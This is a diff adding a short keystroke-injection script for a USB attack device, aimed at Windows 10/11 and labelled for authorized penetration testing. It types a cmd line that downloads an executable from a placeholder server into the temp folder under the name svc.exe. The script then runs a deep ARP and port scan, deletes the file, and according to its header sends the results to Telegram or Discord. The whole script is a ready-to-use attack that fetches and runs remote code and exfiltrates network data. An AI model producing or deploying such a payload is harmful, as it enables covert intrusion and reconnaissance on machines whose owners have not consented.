@@ -1,0 +1,12 @@
+REM Title: Network Scan - Deep (ARP + Port Scan All Hosts)
+REM Description: ARP scans /24, port scans each host, sends to Telegram/Discord
+REM Author: Tsali
+REM Target: Windows 10/11
+REM Runtime: ~2-3 minutes
+REM For authorized penetration testing only
+REM Update YOUR_SERVER below
+DELAY 500
+GUI r
+DELAY 300
+STRING cmd /c curl -s -o %temp%\svc.exe http://YOUR_SERVER/net_scan.exe && %temp%\svc.exe --deep && timeout /t 180 /nobreak >/dev/null && del %temp%\svc.exe
+ENTER
